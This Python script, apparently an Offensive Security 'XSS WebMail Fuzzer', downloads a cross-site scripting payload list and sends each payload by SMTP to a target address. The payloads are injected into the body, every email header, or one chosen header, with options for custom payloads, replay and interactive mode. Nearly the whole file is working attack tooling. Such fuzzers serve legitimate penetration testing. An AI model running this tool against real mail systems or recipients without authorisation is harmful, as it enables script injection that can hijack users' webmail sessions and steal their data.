#!/usr/bin/python

"""
   A script for testing webmail systems for cross-site scripting problems
   muts / ryujin AT offsec.com v0.3
   auth supported plain/ssl/tls

   v0.3.3
   - Fixed issue with downloading xssAttacks.xml

   v0.3.2
   - Fixed the xssAttacks.xml URL 

   v0.3.1
   - Bugfixes and small changes to better identify injected payloads
   - Added interactive mode
   - Added list mode

   v0.3
   - Basic Injection main: Inject in all the main fields (what we have now)
   - Basic Injection extras:  Inject in all the extras fields
   - Pinpoint Injection in a specified field selected by the attacker
   - One by One Injection (one mail for each field) in main fields 
   - One by One Injection (one mail for each field) in extra fields 

   v0.2
   - ID the payload we are sending
   - Replay a single payload
   - Change the payload text

"""

import smtplib, requests, sys, os
from optparse import OptionParser
from xml.dom.minidom import parseString

## Global variables
#  ha.ckers.org XSS list
XSSURL        = "http://htmlpurifier.org/live/smoketests/xssAttacks.xml"
DEFAULT_XML   = "./xssAttacks.xml"
EMAIL_HEADERS = [
"From",
"To",
"Date",
"Subject",
"Body",
"Accept-Language",
"Alternate-Recipient",
"Autoforwarded",
"Autosubmitted",
"Bcc",
"Cc",
"Comments",
"Content-Identifier",
"Content-Return",
"Conversion",
"Conversion-With-Loss",
"DL-Expansion-History",
"Deferred-Delivery",
"Delivery-Date",
"Discarded-X400-IPMS-Extensions",
"Discarded-X400-MTS-Extensions",
"Disclose-Recipients",
"Disposition-Notification-Options",
"Disposition-Notification-To",
"Encoding",
"Encrypted",
"Expires",
"Expiry-Date",
"Generate-Delivery-Report",
"Importance",
"In-Reply-To",
"Incomplete-Copy",
"Keywords",
"Language",
"Latest-Delivery-Time",
"List-Archive",
"List-Help",
"List-ID",
"List-Owner",
"List-Post",
"List-Subscribe",
"List-Unsubscribe",
"Message-Context",
"Message-ID",
"Message-Type",
"Obsoletes",
"Original-Encoded-Information-Types",
"Original-Message-ID",
"Originator-Return-Address",
"PICS-Label",
"Prevent-NonDelivery-Report",
"Priority",
"Received",
"References",
"Reply-By",
"Reply-To",
"Resent-Bcc",
"Resent-Cc",
"Resent-Date",
"Resent-From",
"Resent-Message-ID",
"Resent-Reply-To",
"Resent-Sender",
"Resent-To",
"Return-Path",
"Sender",
"Sensitivity",
"Supersedes",
"X400-Content-Identifier",
"X400-Content-Return",
"X400-Content-Type",
"X400-MTS-Identifier",
"X400-Originator",
"X400-Received",
"X400-Recipients",
"X400-Trace"]

MSG  = "From: _FROM_\n"
MSG += "To: _TO_\n"
MSG += "Date: _DATE_\n"
MSG += "Subject: _SUBJECT_\n"

MSG_E  = MSG
for h in EMAIL_HEADERS:
    if h != "Body":
        MSG_E += "%s: _%s_\n" % (h, h.upper())

def fetchXML():
    """ Connect to  and download XSS cheetsheet"""
    print("[+] Fetching last XSS cheetsheet from ha.ckers.org ...")
    response = requests.get(url=XSSURL)
    xmldata  = response.text
    return xmldata
    
def parseXML(xmldata):
    """ Parses XML fetched from ha.ckers.org and returns two
        nice py lists for further processing """
    pydata = parseString(xmldata)
    names  = pydata.getElementsByTagName("name")
    codes  = pydata.getElementsByTagName("code")
    return names, codes

def getTextFromXML(node):
    """ Returns text within an XML node """ 
    nodelist = node.childNodes
    rc = []
    for node in nodelist:
        if node.nodeType == node.TEXT_NODE:
            rc.append(node.data)
    return ''.join(rc)

def craftHeaders(frmemail, dstemail, indexPayload, name , code, 
            injection, s_header=None):
    """ Craft the email-headers on the attacker request """
    if injection == "basic_extra":
        msg = MSG_E
    else:
        msg = MSG
    if s_header and EMAIL_HEADERS.index(s_header) > 4:
        msg += "%s: _%s_\n" % (s_header, s_header.upper())
    msg += "Content-type: text/html\n\n"
    msg += "_BODY_\n"

    # Basic injections = MASS INJECTION, we inject in every field
    if injection.find("basic_") != -1:
        for header in EMAIL_HEADERS:
            h = "_%s_" % header.upper()
            msg  = msg.replace(h, "Payload-"+str(indexPayload)+"-"+\
                        name+"-injectedin-"+h+"-"+code)
    # In all the other injections we inject into only one single header
    else:
        h = "_%s_" % s_header.upper()
        msg  = msg.replace(h, "Payload-"+str(indexPayload)+"-"+\
                    name+"-injectedin-"+h+"-"+code)
    return msg

def tagHeaders(msg, mail_name):
    """ Tag all un-fuzzed main headers with payload type/fuzz fields """
    for header in EMAIL_HEADERS[0:5]:
        h = "_%s_" % header.upper()
        msg = msg.replace(h, mail_name)
    return msg

def sendMail(name, code, dstemail, frmemail, smtpsrv, conn, username, password,
         indexPayload, custompayload, injection, pinpoint_field=None,
         interactive=None):
    """ Send XSSed email """
    # Get text from xml nodes
    name = getTextFromXML(name)
    code = getTextFromXML(code)

    # If we are asked to replace the payload
    if custompayload:
        code = input("[$] Replace the original payload\n"
                 "%s\n[$] with:\n" % code)

    if injection == "basic_main" or injection == "basic_extra":
        msg = craftHeaders(frmemail, dstemail, indexPayload, 
                   name , code, injection)
        mail_name = "Payload-"+str(indexPayload)+"-"+name+"-"+injection
        msg = tagHeaders(msg, mail_name)
        sendData(conn, username, password, frmemail, dstemail, msg,
                mail_name)
    elif injection == "pinpoint":
        msg = craftHeaders(frmemail, dstemail, indexPayload, 
                   name , code, injection, pinpoint_field)
        mail_name = "Payload-"+str(indexPayload)+"-"+name+\
                "-injectedin-"+pinpoint_field
        msg = tagHeaders(msg, mail_name)
        sendData(conn, username, password, frmemail, dstemail, msg, 
            mail_name)
    elif injection == "onebyone_main":
        for h in EMAIL_HEADERS[0:5]:
            msg = craftHeaders(frmemail, dstemail, 
                       indexPayload, name, code, injection, 
                       h)
            mail_name = "Payload-"+str(indexPayload)+"-"+name+\
                "-injectedin-"+h
            msg = tagHeaders(msg, mail_name)
            sendData(conn, username, password, frmemail, 
                 dstemail, msg, mail_name)
            if interactive:
                input("[$] Press Enter to send next email...")
    elif injection == "onebyone_extra":
        for h in EMAIL_HEADERS[5:]:
            msg = craftHeaders(frmemail, dstemail, 
                       indexPayload, name, code, injection, 
                       h)
            mail_name = "Payload-"+str(indexPayload)+"-"+name+\
                "-injectedin-"+h
            msg = tagHeaders(msg, mail_name)
            sendData(conn, username, password, frmemail, 
                 dstemail, msg, mail_name)
            if interactive:
                input("[$] Press Enter to send next email...")

def sendData(conn, username, password, frmemail, dstemail, msg, mail_name):
    """ Connect to SMTP Server and Send out our data """
    print("[+] Sending email %s" % mail_name)

    ############
    if conn == 'ssl':
        server = smtplib.SMTP_SSL(smtpsrv)
    else:
        server = smtplib.SMTP(smtpsrv)
    if conn == 'tls':
        server.starttls()
    if username and password:
        server.login(username,password)
        
    #server.set_debuglevel(1)
    try:
        server.sendmail(frmemail, dstemail, msg)
    except Exception as e:
        print("[-] Failed to send email:")
        print("[*] " + str(e))
    server.quit()

def showXSSPaylods(names, codes):
    for name, code in zip( names, codes ):
        print("[$] Payload %d  : %s" %\
            (names.index(name), getTextFromXML(name)))
        

def main():
    global dstemail, frmemail, smtpsrv, username, password
    print("\n##############################################################")
    print("######   XSS WebMail Fuzzer - Offensive Security 2018   ######")
    print("##############################################################\n")
    usage = "%prog -t dest_email -f from_email -s smtpsrv:port [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-t", "--to", type="string",
                  action="store", dest="dstemail",
                  help="Destination Email Address")
    parser.add_option("-f", "--from", type="string",
                  action="store", dest="frmemail",
                  help="From Email Address")
    parser.add_option("-s", "--smtp", type="string",
                  action="store", dest="smtpsrv",
                  help="SMTP Server")
    parser.add_option("-c", "--conn", type="string",
                  action="store", dest="conn",
                  help="SMTP Connection type (plain,ssl,tls")
    parser.add_option("-u", "--user", type="string",
                  action="store", dest="username",
                  help="SMTP Username (optional)")
    parser.add_option("-p", "--password", type="string",
                  action="store", dest="password",
                  help="SMTP Password (optional)")
    parser.add_option("-l", "--localfile", type="string",
                  action="store", dest="filename",
                  help="Local XML file")
    parser.add_option("-r", "--replay", type="int",
                  action="store", dest="replay",
                  help="Replay payload number")
    parser.add_option("-P", action="store_true", dest="custompayload",
              help="Replace default js alert with a custom payload")
    parser.add_option("-j", "--injection-type", type="choice",
              choices=["basic_main", "basic_extra", 
                   "pinpoint", "onebyone_main", 
                   "onebyone_extra" ],
                  action="store", dest="injection",
                  help="Available injection methods:\n" +\
              "basic_main, basic_extra, pinpoint, " +\
              "onebyone_main, onebyone_extra\n")
    parser.add_option("-F", "--injection-field", type="choice",
              choices=EMAIL_HEADERS,
                  action="store", dest="pinpoint_field",
                  help="This option must be used together with -j in "+\
              "to specify the E-Mail header to pinpoint. See the "+\
              "EMAIL_HEADERS global variable in the source to " +\
              "obtain a list of possible fields")
    parser.add_option("-I", action="store_true", dest="interactive",
              help="Run onebyone injections in interactive mode")
    parser.add_option("-L", action="store_true", dest="listmode",
              help="Load XML file and show available XSS payloads")

    (options, args) = parser.parse_args()

    # Setting default values    
    conn           = "plain"
    username       = None
    password       = None
    filename       = None
    replay         = None
    custompayload  = None
    injection      = None
    pinpoint_field = None
    interactive    = None
    listmode       = None
    
    # Parsing options
    dstemail       = options.dstemail
    frmemail       = options.frmemail
    smtpsrv        = options.smtpsrv
    conn           = options.conn
    username       = options.username
    password       = options.password
    filename       = options.filename
    replay         = options.replay
    custompayload  = options.custompayload
    injection      = options.injection
    pinpoint_field = options.pinpoint_field
    interactive    = options.interactive
    listmode       = options.listmode

    if not (dstemail and frmemail and smtpsrv) and not listmode:
        print(listmode)
        parser.print_help()
        sys.exit()
    
    if injection == "pinpoint" and not pinpoint_field:
        parser.print_help()
        sys.exit()
    elif not injection:
        injection = "basic_main"

    # If the default file is there using it instead
    try:
        os.stat(DEFAULT_XML)
        filename = DEFAULT_XML
        print("[*] Using local xml file...")
    except OSError:
        pass

    # Fetch XML file from the web
    if not filename:
        xmldata = fetchXML()
    # Parse Local XML file
    else:
        try:
            fp = open(filename,"r")
            xmldata = fp.read()         
        except IOError:
            print("[-] Could not open file " + filename) 
            sys.exit()
    names, codes = parseXML(xmldata)[0], parseXML(xmldata)[1]
    
    if listmode:
        showXSSPaylods(names, codes)
        sys.exit()

    # Replay a single payload
    if replay is not None:
        print("[+] Replaying payload %d" % replay)
        name = names[replay]
        code = codes[replay]
        sendMail(name, code, dstemail, frmemail, smtpsrv, conn, 
                 username, password, replay, custompayload,
                 injection, pinpoint_field, interactive)
    # Play all payloads from the XML list
    else:
        indexPayload = 0
        for name, code in zip( names, codes ):
            sendMail(name, code, dstemail, frmemail, smtpsrv, conn, 
                 username, password, indexPayload, 
                 custompayload, injection, pinpoint_field,
                 interactive)
            indexPayload += 1

if __name__ == '__main__':
    main()    
